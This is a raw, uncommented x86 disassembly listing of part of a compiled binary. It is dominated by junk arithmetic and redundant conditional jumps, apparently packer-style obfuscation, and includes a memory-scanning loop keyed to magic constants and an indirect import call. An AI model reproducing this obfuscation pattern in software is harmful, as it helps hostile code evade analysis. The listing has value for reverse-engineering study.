  41baf0:	jne    0x41bb29
  41baf2:	mov    eax,ecx
  41baf4:	mov    ecx,DWORD PTR [ebp-0x4]
  41baf7:	sub    DWORD PTR [ebp-0x4],ecx
  41bafa:	cmp    eax,DWORD PTR [ebp-0x48]
  41bafd:	jne    0x41bb29
  41baff:	or     edx,esi
  41bb01:	add    eax,eax
  41bb03:	test   edi,0x6718
  41bb09:	je     0x41bb29
  41bb0b:	and    edx,ebx
  41bb0d:	add    DWORD PTR [ebp-0x4],edx
  41bb10:	add    eax,edx
  41bb12:	mov    edx,DWORD PTR [ebp-0x30]
  41bb15:	cmp    eax,0xc6b50520
  41bb1a:	je     0x41bb29
  41bb1c:	sub    DWORD PTR [ebp-0x30],edx
  41bb1f:	test   eax,0xc432
  41bb24:	jne    0x41bb29
  41bb26:	or     DWORD PTR [ebp-0x30],eax
  41bb29:	leave  
  41bb2a:	ret    
  41bb2b:	int3   
  41bb2c:	int3   
  41bb2d:	int3   
  41bb2e:	int3   
  41bb2f:	int3   
  41bb30:	push   ebp
  41bb31:	mov    ebp,esp
  41bb33:	sub    esp,0x60
  41bb36:	mov    ecx,0xb2
  41bb3b:	mov    DWORD PTR [ebp-0x30],ecx
  41bb3e:	push   ebx
  41bb3f:	mov    ecx,DWORD PTR [ebp-0x30]
  41bb42:	add    ecx,ecx
  41bb44:	sub    DWORD PTR [ebp-0x30],ecx
  41bb47:	push   esi
  41bb48:	mov    eax,DWORD PTR ds:0x45998c
  41bb4e:	test   ecx,0x2f3c
  41bb54:	jne    0x41bb59
  41bb56:	sub    DWORD PTR [ebp-0x30],eax
  41bb59:	push   edi
  41bb5a:	mov    esi,DWORD PTR [ebp-0x30]
  41bb5d:	sub    esi,eax
  41bb5f:	cmp    esi,DWORD PTR [ebp-0x4c]
  41bb62:	jne    0x41bb85
  41bb64:	mov    ebx,DWORD PTR [ebp-0x30]
  41bb67:	cmp    ebx,0xffffff93
  41bb6a:	jne    0x41bb85
  41bb6c:	mov    edx,0xf5
  41bb71:	sub    ebx,esi
  41bb73:	cmp    esi,DWORD PTR ds:0x45998c
  41bb79:	jne    0x41bb85
  41bb7b:	add    DWORD PTR [ebp-0x30],ebx
  41bb7e:	add    edx,eax
  41bb80:	sub    edx,ecx
  41bb82:	and    DWORD PTR [ebp-0x30],edx
  41bb85:	sub    edx,ecx
  41bb87:	mov    edi,ebx
  41bb89:	cmp    edx,0x7a
  41bb8c:	jne    0x41bc6f
  41bb92:	mov    ebx,DWORD PTR ds:0x45998c
  41bb98:	sub    edi,eax
  41bb9a:	cmp    edx,0x23
  41bb9d:	je     0x41bc6f
  41bba3:	sub    edx,edi
  41bba5:	mov    eax,DWORD PTR [ebp-0x30]
  41bba8:	mov    ecx,edx
  41bbaa:	add    DWORD PTR [ebp-0x30],ebx
  41bbad:	test   edx,0xf8da
  41bbb3:	je     0x41bc6f
  41bbb9:	mov    edi,0xc925
  41bbbe:	mov    edx,DWORD PTR [ebp-0x30]
  41bbc1:	or     DWORD PTR [ebp-0x30],esi
  41bbc4:	or     DWORD PTR [ebp-0x30],eax
  41bbc7:	mov    DWORD PTR [ebp-0x28],esi
  41bbca:	sub    edx,esi
  41bbcc:	test   edx,0x4e
  41bbd2:	jne    0x41bc6f
  41bbd8:	and    DWORD PTR [ebp-0x30],edi
  41bbdb:	cmp    eax,0x1
  41bbde:	je     0x41bc6f
  41bbe4:	mov    edi,DWORD PTR ds:0x45998c
  41bbea:	mov    ebx,0x51
  41bbef:	cmp    edx,DWORD PTR ds:0x45998c
  41bbf5:	je     0x41bc6f
  41bbf7:	test   ecx,0xe3
  41bbfd:	je     0x41bc6f
  41bbff:	mov    DWORD PTR [ebp-0x34],edx
  41bc02:	sub    edi,ebx
  41bc04:	or     ecx,eax
  41bc06:	and    ecx,esi
  41bc08:	mov    esi,DWORD PTR [ebp-0x28]
  41bc0b:	mov    eax,DWORD PTR [ebp-0x34]
  41bc0e:	cmp    ecx,DWORD PTR [ebp-0x48]
  41bc11:	je     0x41bc6f
  41bc13:	mov    edx,DWORD PTR [ebp-0x28]
  41bc16:	test   esi,0xfefc
  41bc1c:	je     0x41bc6f
  41bc1e:	add    edi,edx
  41bc20:	mov    edx,DWORD PTR [ebp-0x34]
  41bc23:	mov    ebx,DWORD PTR [ebp-0x28]
  41bc26:	sub    edi,edx
  41bc28:	sub    eax,edx
  41bc2a:	mov    DWORD PTR [ebp-0x8],edi
  41bc2d:	xor    DWORD PTR [ebp-0x30],esi
  41bc30:	add    DWORD PTR [ebp-0x28],ebx
  41bc33:	sub    DWORD PTR [ebp-0x30],eax
  41bc36:	and    ecx,edx
  41bc38:	test   ebx,0xc9
  41bc3e:	je     0x41bc6f
  41bc40:	mov    edx,DWORD PTR [ebp-0x8]
  41bc43:	add    DWORD PTR [ebp-0x28],edi
  41bc46:	or     DWORD PTR [ebp-0x28],edx
  41bc49:	mov    edx,DWORD PTR [ebp-0x8]
  41bc4c:	mov    DWORD PTR [ebp-0x28],edx
  41bc4f:	and    DWORD PTR [ebp-0x28],eax
  41bc52:	cmp    ecx,DWORD PTR ds:0x45998c
  41bc58:	je     0x41bc6f
  41bc5a:	mov    edi,0x625d
  41bc5f:	mov    edx,0x4c
  41bc64:	and    edx,eax
  41bc66:	and    DWORD PTR [ebp-0x28],edi
  41bc69:	add    DWORD PTR [ebp-0x30],edx
  41bc6c:	mov    DWORD PTR [ebp-0x30],ecx
  41bc6f:	mov    DWORD PTR [ebp-0x38],0x2dc42709
  41bc76:	mov    eax,0x4b
  41bc7b:	mov    eax,DWORD PTR ds:0x45998c
  41bc81:	add    DWORD PTR [ebp-0x30],eax
  41bc84:	call   0x41c438
  41bc89:	mov    edx,DWORD PTR [ebp-0x30]
  41bc8c:	cmp    edx,0xffffffb8
  41bc8f:	je     0x41bd1e
  41bc95:	mov    edi,0xb0
  41bc9a:	cmp    eax,0x76
  41bc9d:	je     0x41bd1e
  41bc9f:	and    edx,edi
  41bca1:	mov    ecx,0xb0
  41bca6:	mov    edi,DWORD PTR ds:0x459984
  41bcac:	and    edx,eax
  41bcae:	test   edx,0x1e
  41bcb4:	je     0x41bd1e
  41bcb6:	mov    esi,DWORD PTR [ebp-0x30]
  41bcb9:	mov    ebx,DWORD PTR [ebp-0x30]
  41bcbc:	and    edi,edx
  41bcbe:	add    ecx,eax
  41bcc0:	cmp    ecx,0x6a16
  41bcc6:	je     0x41bd1e
  41bcc8:	mov    edx,DWORD PTR [ebp-0x30]
  41bccb:	sub    DWORD PTR [ebp-0x30],edi
  41bcce:	cmp    ebx,DWORD PTR ds:0x459984
  41bcd4:	jne    0x41bd1e
  41bcd6:	or     ebx,eax
  41bcd8:	add    DWORD PTR [ebp-0x30],edx
  41bcdb:	mov    edx,0x68
  41bce0:	mov    edi,DWORD PTR [ebp-0x30]
  41bce3:	cmp    edi,0xffffffda
  41bce6:	je     0x41bd1e
  41bce8:	sub    esi,ebx
  41bcea:	mov    edx,DWORD PTR [ebp-0x30]
  41bced:	cmp    edx,DWORD PTR [ebp-0x28]
  41bcf0:	je     0x41bd1e
  41bcf2:	mov    ebx,DWORD PTR ds:0x459984
  41bcf8:	mov    DWORD PTR [ebp-0x30],edx
  41bcfb:	mov    edx,ecx
  41bcfd:	xor    DWORD PTR [ebp-0x30],ebx
  41bd00:	add    edi,eax
  41bd02:	or     DWORD PTR [ebp-0x30],esi
  41bd05:	cmp    edx,eax
  41bd07:	jne    0x41bd1e
  41bd09:	mov    esi,0x41
  41bd0e:	sub    DWORD PTR [ebp-0x30],edi
  41bd11:	sub    DWORD PTR [ebp-0x30],ebx
  41bd14:	add    esi,ebx
  41bd16:	or     DWORD PTR [ebp-0x30],esi
  41bd19:	mov    esi,edx
  41bd1b:	add    DWORD PTR [ebp-0x30],esi
  41bd1e:	mov    DWORD PTR [ebp-0x44],eax
  41bd21:	add    edx,edx
  41bd23:	sub    DWORD PTR [ebp-0x30],edx
  41bd26:	call   0x41c438
  41bd2b:	add    DWORD PTR [ebp-0x30],ebx
  41bd2e:	cmp    eax,DWORD PTR [ebp-0x44]
  41bd31:	je     0x41c219
  41bd37:	mov    ecx,0x5f3b
  41bd3c:	or     DWORD PTR [ebp-0x30],ebx
  41bd3f:	cmp    eax,ebx
  41bd41:	jne    0x41be36
  41bd47:	mov    esi,0xdd
  41bd4c:	mov    ebx,DWORD PTR [ebp-0x30]
  41bd4f:	and    DWORD PTR [ebp-0x30],ebx
  41bd52:	add    esi,edi
  41bd54:	test   esi,0x5a
  41bd5a:	jne    0x41be36
  41bd60:	mov    eax,ebx
  41bd62:	mov    edi,DWORD PTR [ebp-0x30]
  41bd65:	cmp    esi,ebx
  41bd67:	je     0x41be36
  41bd6d:	mov    ecx,ebx
  41bd6f:	sub    DWORD PTR [ebp-0x30],ecx
  41bd72:	mov    edx,ecx
  41bd74:	add    edx,ebx
  41bd76:	sub    edi,ecx
  41bd78:	cmp    edx,ecx
  41bd7a:	je     0x41be36
  41bd80:	cmp    esi,DWORD PTR ds:0x459984
  41bd86:	je     0x41be36
  41bd8c:	add    DWORD PTR [ebp-0x30],edi
  41bd8f:	mov    DWORD PTR [ebp-0x30],esi
  41bd92:	cmp    edx,0x2542
  41bd98:	jne    0x41be36
  41bd9e:	mov    edi,DWORD PTR [ebp-0x30]
  41bda1:	cmp    eax,0x433a
  41bda6:	je     0x41be36
  41bdac:	mov    ecx,DWORD PTR [ebp-0x30]
  41bdaf:	mov    esi,DWORD PTR [ebp-0x30]
  41bdb2:	add    ecx,ecx
  41bdb4:	add    DWORD PTR [ebp-0x30],eax
  41bdb7:	add    edi,edx
  41bdb9:	cmp    esi,DWORD PTR ds:0x459984
  41bdbf:	je     0x41be36
  41bdc1:	cmp    esi,0xffffff9e
  41bdc4:	jne    0x41be36
  41bdc6:	mov    eax,DWORD PTR ds:0x45998c
  41bdcc:	cmp    edi,0x4
  41bdcf:	je     0x41be36
  41bdd1:	mov    edx,DWORD PTR [ebp-0x30]
  41bdd4:	mov    ebx,DWORD PTR [ebp-0x30]
  41bdd7:	add    ecx,edx
  41bdd9:	sub    DWORD PTR [ebp-0x30],ecx
  41bddc:	cmp    esi,0xffffff80
  41bddf:	jne    0x41be36
  41bde1:	mov    ecx,DWORD PTR ds:0x459980
  41bde7:	mov    edx,DWORD PTR ds:0x459930
  41bded:	cmp    ebx,DWORD PTR [ebp-0xc]
  41bdf0:	je     0x41be36
  41bdf2:	cmp    esi,DWORD PTR [ebp-0x24]
  41bdf5:	jne    0x41be36
  41bdf7:	and    ecx,edi
  41bdf9:	add    ebx,edi
  41bdfb:	sub    edx,ecx
  41bdfd:	add    ebx,edi
  41bdff:	mov    edi,edx
  41be01:	mov    eax,esi
  41be03:	and    edi,esi
  41be05:	cmp    edi,ebx
  41be07:	jne    0x41be36
  41be09:	mov    ecx,0xa5
  41be0e:	or     ebx,edx
  41be10:	cmp    ebx,DWORD PTR ds:0x45998c
  41be16:	jne    0x41be36
  41be18:	mov    edx,DWORD PTR [ebp-0x30]
  41be1b:	xor    DWORD PTR [ebp-0x30],eax
  41be1e:	add    edi,esi
  41be20:	sub    DWORD PTR [ebp-0x30],eax
  41be23:	mov    eax,DWORD PTR [ebp-0x30]
  41be26:	add    ebx,edi
  41be28:	sub    ebx,esi
  41be2a:	sub    DWORD PTR [ebp-0x30],eax
  41be2d:	sub    DWORD PTR [ebp-0x30],ebx
  41be30:	add    DWORD PTR [ebp-0x30],ecx
  41be33:	xor    DWORD PTR [ebp-0x30],edx
  41be36:	call   0x41c438
  41be3b:	cmp    ebx,DWORD PTR ds:0x459984
  41be41:	jne    0x41c06f
  41be47:	mov    ebx,esi
  41be49:	add    ebx,esi
  41be4b:	cmp    ebx,eax
  41be4d:	jne    0x41c06f
  41be53:	sub    DWORD PTR [ebp-0x30],edi
  41be56:	cmp    ebx,0x51
  41be59:	je     0x41c06f
  41be5f:	mov    edi,DWORD PTR [ebp-0x30]
  41be62:	add    edi,eax
  41be64:	mov    edx,DWORD PTR [ebp-0x30]
  41be67:	sub    DWORD PTR [ebp-0x30],edi
  41be6a:	cmp    edx,0xffffffea
  41be6d:	je     0x41c06f
  41be73:	mov    esi,DWORD PTR [ebp-0x30]
  41be76:	add    esi,esi
  41be78:	sub    edx,eax
  41be7a:	cmp    edx,0x4702
  41be80:	jne    0x41c06f
  41be86:	sub    edx,edi
  41be88:	cmp    ebx,0x41f6
  41be8e:	jne    0x41c06f
  41be94:	cmp    esi,0xc640
  41be9a:	je     0x41c06f
  41bea0:	mov    edi,0x2fac
  41bea5:	sub    edi,esi
  41bea7:	mov    esi,0x67
  41beac:	add    DWORD PTR [ebp-0x30],esi
  41beaf:	sub    ebx,edx
  41beb1:	cmp    edi,0xffffffcf
  41beb4:	je     0x41c06f
  41beba:	mov    esi,DWORD PTR [ebp-0x30]
  41bebd:	mov    edx,0xfd
  41bec2:	and    DWORD PTR [ebp-0x30],edx
  41bec5:	cmp    eax,DWORD PTR ds:0x459930
  41becb:	je     0x41c06f
  41bed1:	mov    edx,0x65
  41bed6:	add    DWORD PTR [ebp-0x30],ebx
  41bed9:	mov    ebx,DWORD PTR [ebp-0x30]
  41bedc:	cmp    eax,DWORD PTR ds:0x459930
  41bee2:	jne    0x41c06f
  41bee8:	cmp    esi,0x308c
  41beee:	je     0x41c06f
  41bef4:	mov    ecx,0xee
  41bef9:	sub    edx,eax
  41befb:	add    edi,esi
  41befd:	add    DWORD PTR [ebp-0x30],ebx
  41bf00:	test   ebx,0x23
  41bf06:	je     0x41c06f
  41bf0c:	cmp    eax,DWORD PTR ds:0x45998c
  41bf12:	je     0x41c06f
  41bf18:	add    DWORD PTR [ebp-0x30],edx
  41bf1b:	mov    edx,DWORD PTR [ebp-0x30]
  41bf1e:	mov    esi,0x9d2e
  41bf23:	add    edx,edx
  41bf25:	cmp    edi,eax
  41bf27:	jne    0x41c06f
  41bf2d:	mov    ebx,0xc1
  41bf32:	cmp    edx,DWORD PTR ds:0x459980
  41bf38:	je     0x41c06f
  41bf3e:	or     DWORD PTR [ebp-0x30],eax
  41bf41:	cmp    edi,DWORD PTR [ebp-0x24]
  41bf44:	jne    0x41c06f
  41bf4a:	sub    DWORD PTR [ebp-0x30],ebx
  41bf4d:	sub    esi,edi
  41bf4f:	sub    esi,edx
  41bf51:	mov    ebx,DWORD PTR [ebp-0x30]
  41bf54:	cmp    ebx,DWORD PTR ds:0x459980
  41bf5a:	jne    0x41c06f
  41bf60:	mov    DWORD PTR [ebp-0x30],esi
  41bf63:	cmp    ebx,0xd945
  41bf69:	jne    0x41c06f
  41bf6f:	and    ebx,ecx
  41bf71:	and    ebx,ecx
  41bf73:	mov    edi,DWORD PTR [ebp-0x30]
  41bf76:	sub    DWORD PTR [ebp-0x30],ecx
  41bf79:	add    edi,eax
  41bf7b:	add    DWORD PTR [ebp-0x30],ecx
  41bf7e:	cmp    ebx,DWORD PTR ds:0x45998c
  41bf84:	jne    0x41c06f
  41bf8a:	mov    esi,0x3c1f
  41bf8f:	sub    DWORD PTR [ebp-0x30],ebx
  41bf92:	mov    ecx,DWORD PTR [ebp-0x30]
  41bf95:	sub    edi,edx
  41bf97:	cmp    edi,DWORD PTR ds:0x459930
  41bf9d:	jne    0x41c06f
  41bfa3:	mov    edx,DWORD PTR [ebp-0x30]
  41bfa6:	mov    ebx,DWORD PTR [ebp-0x30]
  41bfa9:	sub    esi,eax
  41bfab:	sub    ecx,eax
  41bfad:	and    DWORD PTR [ebp-0x30],ebx
  41bfb0:	test   eax,0x47
  41bfb5:	je     0x41c06f
  41bfbb:	mov    ebx,0xd0
  41bfc0:	cmp    esi,edi
  41bfc2:	je     0x41c06f
  41bfc8:	sub    edi,eax
  41bfca:	sub    ebx,ecx
  41bfcc:	cmp    edx,DWORD PTR ds:0x459984
  41bfd2:	je     0x41c06f
  41bfd8:	add    DWORD PTR [ebp-0x30],edi
  41bfdb:	or     DWORD PTR [ebp-0x30],edx
  41bfde:	mov    edx,0x9e
  41bfe3:	and    esi,ecx
  41bfe5:	mov    ecx,edx
  41bfe7:	cmp    ebx,edx
  41bfe9:	jne    0x41c06f
  41bfef:	mov    ecx,DWORD PTR ds:0x459930
  41bff5:	mov    edi,esi
  41bff7:	sub    DWORD PTR [ebp-0x30],eax
  41bffa:	add    ebx,ebx
  41bffc:	cmp    ebx,DWORD PTR ds:0x459930
  41c002:	jne    0x41c06f
  41c004:	mov    edx,ebx
  41c006:	mov    esi,DWORD PTR [ebp-0x30]
  41c009:	test   edi,0xc2f3
  41c00f:	jne    0x41c06f
  41c011:	or     ecx,ebx
  41c013:	mov    ebx,DWORD PTR ds:0x459984
  41c019:	cmp    edx,0xffffffcb
  41c01c:	je     0x41c06f
  41c01e:	add    DWORD PTR [ebp-0x30],ecx
  41c021:	add    edi,edi
  41c023:	cmp    edx,0x18
  41c026:	jne    0x41c06f
  41c028:	mov    ecx,0x7a
  41c02d:	cmp    edx,DWORD PTR ds:0x459984
  41c033:	je     0x41c06f
  41c035:	cmp    esi,0xffffffab
  41c038:	je     0x41c06f
  41c03a:	add    ecx,edx
  41c03c:	cmp    edi,0xffffff82
  41c03f:	jne    0x41c06f
  41c041:	and    ebx,ecx
  41c043:	mov    ecx,DWORD PTR [ebp-0x30]
  41c046:	and    esi,eax
  41c048:	mov    edx,DWORD PTR ds:0x459998
  41c04e:	mov    DWORD PTR [ebp-0x30],edx
  41c051:	cmp    edi,0xffffffb5
  41c054:	je     0x41c06f
  41c056:	sub    DWORD PTR [ebp-0x30],ebx
  41c059:	mov    edx,0xf2
  41c05e:	add    DWORD PTR [ebp-0x30],ecx
  41c061:	or     DWORD PTR [ebp-0x30],esi
  41c064:	or     edi,eax
  41c066:	sub    DWORD PTR [ebp-0x30],edi
  41c069:	and    DWORD PTR [ebp-0x30],edi
  41c06c:	xor    DWORD PTR [ebp-0x30],edx
  41c06f:	cmp    eax,DWORD PTR [ebp-0x44]
  41c072:	je     0x41c219
  41c078:	cmp    edi,0x8568
  41c07e:	je     0x41c0a3
  41c080:	mov    ecx,DWORD PTR [ebp-0x30]
  41c083:	add    ecx,ebx
  41c085:	mov    edx,DWORD PTR [ebp-0x30]
  41c088:	add    DWORD PTR [ebp-0x30],eax
  41c08b:	add    DWORD PTR [ebp-0x30],edx
  41c08e:	cmp    ecx,0x43
  41c091:	je     0x41c0a3
  41c093:	mov    esi,ebx
  41c095:	mov    edx,DWORD PTR [ebp-0x30]
  41c098:	sub    DWORD PTR [ebp-0x30],edx
  41c09b:	mov    DWORD PTR [ebp-0x30],ecx
  41c09e:	and    esi,edi
  41c0a0:	add    DWORD PTR [ebp-0x30],esi
  41c0a3:	add    DWORD PTR [ebp-0x38],0xa59d898f
  41c0aa:	add    DWORD PTR [ebp-0x30],esi
  41c0ad:	push   0x45998c
  41c0b2:	call   DWORD PTR ds:0x45a464
  41c0b8:	cmp    esi,0x54
  41c0bb:	jne    0x41c0c6
  41c0bd:	mov    ecx,DWORD PTR ds:0x459980
  41c0c3:	sub    DWORD PTR [ebp-0x30],ecx
  41c0c6:	or     eax,eax
  41c0c8:	je     0x41c219
  41c0ce:	add    ecx,edi
  41c0d0:	add    DWORD PTR [ebp-0x30],ecx
  41c0d3:	add    DWORD PTR [ebp-0x38],0x6b205b58
  41c0da:	sub    DWORD PTR [ebp-0x30],esi
  41c0dd:	lea    ecx,[eax+0x852]
  41c0e3:	or     DWORD PTR [ebp-0x30],ebx
  41c0e6:	inc    ecx
  41c0e7:	mov    DWORD PTR [ebp-0x54],ecx
  41c0ea:	mov    ebx,DWORD PTR [ecx]
  41c0ec:	mov    eax,DWORD PTR [ebp-0x30]
  41c0ef:	mov    esi,DWORD PTR [ebp-0x30]
  41c0f2:	add    DWORD PTR [ebp-0x30],ebx
  41c0f5:	cmp    eax,0x33
  41c0f8:	jne    0x41c19d
  41c0fe:	mov    edx,DWORD PTR [ebp-0x30]
  41c101:	mov    edi,ebx
  41c103:	cmp    ebx,DWORD PTR [ebp-0xc]
  41c106:	je     0x41c19d
  41c10c:	sub    DWORD PTR [ebp-0x54],eax
  41c10f:	add    edi,ecx
  41c111:	cmp    edx,DWORD PTR [ebp-0x34]
  41c114:	je     0x41c19d
  41c11a:	cmp    esi,DWORD PTR ds:0x459998
  41c120:	je     0x41c19d
  41c122:	add    DWORD PTR [ebp-0x54],edx
  41c125:	or     DWORD PTR [ebp-0x54],esi
  41c128:	test   edi,0xf6
  41c12e:	jne    0x41c19d
  41c130:	add    DWORD PTR [ebp-0x54],edx
  41c133:	or     edi,ecx
  41c135:	mov    esi,DWORD PTR [ebp-0x30]
  41c138:	cmp    ebx,DWORD PTR ds:0x459980
  41c13e:	je     0x41c19d
  41c140:	sub    DWORD PTR [ebp-0x30],eax
  41c143:	mov    eax,esi
  41c145:	mov    esi,0x9aab
  41c14a:	and    esi,ebx
  41c14c:	or     DWORD PTR [ebp-0x54],edx
  41c14f:	cmp    eax,0x86bb
  41c154:	je     0x41c19d
  41c156:	cmp    edi,DWORD PTR [ebp-0x4c]
  41c159:	je     0x41c19d
  41c15b:	mov    edx,eax
  41c15d:	cmp    edi,0xffffffa4
  41c160:	jne    0x41c19d
  41c162:	sub    DWORD PTR [ebp-0x30],edx
  41c165:	cmp    edi,DWORD PTR [ebp-0x40]
  41c168:	je     0x41c19d
  41c16a:	test   esi,0xf00
  41c170:	je     0x41c19d
  41c172:	cmp    edi,0xffffffad
  41c175:	je     0x41c19d
  41c177:	mov    eax,0xc
  41c17c:	cmp    edi,0x4c1a
  41c182:	jne    0x41c19d
  41c184:	sub    esi,edi
  41c186:	mov    edx,DWORD PTR [ebp-0x30]
  41c189:	mov    edi,0x6d
  41c18e:	sub    edi,eax
  41c190:	add    edx,eax
  41c192:	or     edi,eax
  41c194:	sub    DWORD PTR [ebp-0x30],esi
  41c197:	sub    DWORD PTR [ebp-0x30],edi
  41c19a:	xor    DWORD PTR [ebp-0x30],edx
  41c19d:	sub    ebx,0xbdd4a463
  41c1a3:	mov    esi,0x30
  41c1a8:	and    esi,ebx
  41c1aa:	and    esi,edx
  41c1ac:	cmp    ebx,ecx
  41c1ae:	je     0x41c1b3
  41c1b0:	sub    DWORD PTR [ebp-0x30],esi
  41c1b3:	cmp    ebx,0xb19dd00b
  41c1b9:	jne    0x41c0e3
  41c1bf:	add    DWORD PTR [ebp-0x30],edx
  41c1c2:	mov    ebx,DWORD PTR [ecx+0x4]
  41c1c5:	mov    esi,DWORD PTR [ebp-0x54]
  41c1c8:	mov    eax,0x27
  41c1cd:	cmp    esi,DWORD PTR ds:0x45998c
  41c1d3:	je     0x41c216
  41c1d5:	mov    edi,DWORD PTR [ebp-0x54]
  41c1d8:	cmp    ebx,0x8ab2
  41c1de:	je     0x41c216
  41c1e0:	sub    DWORD PTR [ebp-0x54],eax
  41c1e3:	mov    eax,0x44
  41c1e8:	cmp    ebx,DWORD PTR ds:0x459998
  41c1ee:	jne    0x41c216
  41c1f0:	sub    DWORD PTR [ebp-0x54],eax
  41c1f3:	sub    edi,ebx
  41c1f5:	mov    eax,0x82
  41c1fa:	cmp    edi,0x7c
  41c1fd:	je     0x41c209
  41c1ff:	sub    esi,ecx
  41c201:	sub    DWORD PTR [ebp-0x30],edi
  41c204:	add    esi,edx
  41c206:	add    DWORD PTR [ebp-0x54],esi
  41c209:	sub    eax,edx
  41c20b:	or     eax,edx
  41c20d:	mov    edx,DWORD PTR [ebp-0x54]
  41c210:	and    DWORD PTR [ebp-0x30],edx
  41c213:	add    DWORD PTR [ebp-0x54],eax
  41c216:	sub    DWORD PTR [ebp-0x38],ebx
  41c219:	mov    eax,0x27
  41c21e:	mov    esi,eax
  41c220:	mov    DWORD PTR [ebp-0x20],esi
  41c223:	mov    eax,edi
  41c225:	or     eax,edx
  41c227:	add    DWORD PTR [ebp-0x54],eax
  41c22a:	mov    edx,DWORD PTR [ebp+0xc]
  41c22d:	cmp    edx,DWORD PTR [ebp-0x48]
  41c230:	je     0x41c2b0
  41c232:	cmp    edx,0x7a0
  41c238:	je     0x41c2b0
  41c23a:	and    ebx,edi
  41c23c:	mov    esi,0xb735
  41c241:	sub    esi,edx
  41c243:	mov    eax,0x6ffb
  41c248:	add    DWORD PTR [ebp-0x20],eax
  41c24b:	sub    ebx,eax
  41c24d:	test   ebx,0x32
  41c253:	jne    0x41c2b0
  41c255:	mov    eax,DWORD PTR [ebp-0x54]
  41c258:	mov    ecx,DWORD PTR [ebp-0x54]
  41c25b:	and    DWORD PTR [ebp-0x20],eax
  41c25e:	add    ecx,edi
  41c260:	add    esi,ebx
  41c262:	or     ecx,esi
  41c264:	add    ecx,edi
  41c266:	add    ecx,ebx
  41c268:	add    ecx,edx
  41c26a:	add    ecx,eax
  41c26c:	sub    ecx,edi
  41c26e:	test   esi,0x49
  41c274:	jne    0x41c2b0
  41c276:	and    ecx,edi
  41c278:	cmp    ecx,eax
  41c27a:	jne    0x41c2b0
  41c27c:	mov    eax,DWORD PTR [ebp-0x30]
  41c27f:	mov    ebx,DWORD PTR ds:0x459980
  41c285:	add    ebx,edx
  41c287:	and    ecx,eax
  41c289:	cmp    ecx,DWORD PTR [ebp-0x60]
  41c28c:	jne    0x41c2b0
  41c28e:	mov    esi,DWORD PTR [ebp-0x20]
  41c291:	test   esi,0xf1
  41c297:	je     0x41c2b0
  41c299:	mov    eax,0x83
  41c29e:	mov    edi,0xc3
  41c2a3:	add    esi,ecx
  41c2a5:	sub    eax,esi
  41c2a7:	xor    DWORD PTR [ebp-0x20],ebx
  41c2aa:	mov    DWORD PTR [ebp-0x30],eax
  41c2ad:	sub    DWORD PTR [ebp-0x54],edi
  41c2b0:	mov    eax,DWORD PTR [ebp-0x38]
  41c2b3:	mov    ecx,0xcf
  41c2b8:	xor    DWORD PTR [ebp-0x30],eax
  41c2bb:	add    ecx,esi
  41c2bd:	cmp    ecx,DWORD PTR [ebp-0x50]
  41c2c0:	je     0x41c2dd
  41c2c2:	cmp    ecx,edx
  41c2c4:	jne    0x41c2dd
  41c2c6:	mov    ebx,DWORD PTR ds:0x45998c
  41c2cc:	mov    edi,DWORD PTR ds:0x45998c
  41c2d2:	sub    DWORD PTR [ebp-0x54],edx
  41c2d5:	add    ecx,edi
  41c2d7:	sub    DWORD PTR [ebp-0x30],ecx
  41c2da:	xor    DWORD PTR [ebp-0x20],ebx
  41c2dd:	mov    DWORD PTR [edx+0x0],eax
  41c2e0:	add    DWORD PTR [ebp-0x30],esi
  41c2e3:	or     eax,esi
  41c2e5:	mov    esi,DWORD PTR [ebp-0x20]
  41c2e8:	sub    eax,ecx
  41c2ea:	mov    edx,DWORD PTR [ebp-0x54]
  41c2ed:	and    esi,ebx
  41c2ef:	cmp    eax,DWORD PTR ds:0x459998
  41c2f5:	je     0x41c32e
  41c2f7:	and    DWORD PTR [ebp-0x30],edx
  41c2fa:	xor    DWORD PTR [ebp-0x20],ebx
  41c2fd:	sub    DWORD PTR [ebp-0x20],eax
  41c300:	cmp    esi,DWORD PTR [ebp-0x3c]
  41c303:	jne    0x41c32e
  41c305:	cmp    esi,0xb12f
  41c30b:	je     0x41c32e
  41c30d:	cmp    eax,DWORD PTR ds:0x459998
  41c313:	jne    0x41c32e
  41c315:	mov    ecx,0x3f
  41c31a:	mov    edx,0x1
  41c31f:	and    esi,edi
  41c321:	add    DWORD PTR [ebp-0x20],esi
  41c324:	sub    edx,edi
  41c326:	add    DWORD PTR [ebp-0x20],edi
  41c329:	and    ecx,edx
  41c32b:	xor    DWORD PTR [ebp-0x20],ecx
  41c32e:	pop    edi
  41c32f:	mov    esi,0x4b
  41c334:	mov    eax,0x19
  41c339:	add    esi,edx
  41c33b:	and    eax,ecx
  41c33d:	add    DWORD PTR [ebp-0x30],eax
  41c340:	mov    DWORD PTR [ebp-0x4],edi
  41c343:	sub    esi,edi
  41c345:	cmp    esi,0xffffff8e
  41c348:	jne    0x41c3b8
  41c34a:	add    esi,esi
  41c34c:	or     esi,edi
  41c34e:	mov    eax,DWORD PTR [ebp-0x20]
  41c351:	and    esi,eax
  41c353:	sub    esi,edi
  41c355:	cmp    esi,0xffffffa2
  41c358:	jne    0x41c3b8
  41c35a:	mov    eax,0xe9
  41c35f:	mov    edx,DWORD PTR [ebp-0x30]
  41c362:	cmp    esi,eax
  41c364:	je     0x41c3b8
  41c366:	mov    ecx,esi
  41c368:	mov    esi,0x6fe0
  41c36d:	sub    DWORD PTR [ebp-0x20],eax
  41c370:	and    edx,esi
  41c372:	cmp    edx,0x398d
  41c378:	jne    0x41c3b8
  41c37a:	mov    eax,DWORD PTR [ebp-0x4]
  41c37d:	cmp    eax,DWORD PTR [ebp-0x14]
  41c380:	jne    0x41c3b8
  41c382:	sub    DWORD PTR [ebp-0x30],eax
  41c385:	cmp    edi,0x1f
  41c388:	jne    0x41c3b8
  41c38a:	xor    DWORD PTR [ebp-0x4],edx
  41c38d:	mov    eax,ebx
  41c38f:	mov    esi,DWORD PTR [ebp-0x20]
  41c392:	mov    DWORD PTR [ebp-0x18],esi
  41c395:	cmp    ecx,DWORD PTR [ebp-0x10]
  41c398:	jne    0x41c3b8
  41c39a:	add    DWORD PTR [ebp-0x18],eax
  41c39d:	mov    eax,DWORD PTR [ebp-0x30]
  41c3a0:	sub    DWORD PTR [ebp-0x30],eax
  41c3a3:	cmp    ecx,0xfffffff0
  41c3a6:	je     0x41c3b8
  41c3a8:	cmp    ecx,DWORD PTR [ebp-0x60]
  41c3ab:	jne    0x41c3b8
  41c3ad:	test   ecx,0xe6
  41c3b3:	jne    0x41c3b8
  41c3b5:	add    DWORD PTR [ebp-0x18],ecx
  41c3b8:	pop    esi
  41c3b9:	xor    DWORD PTR [ebp-0x30],esi
  41c3bc:	pop    ebx
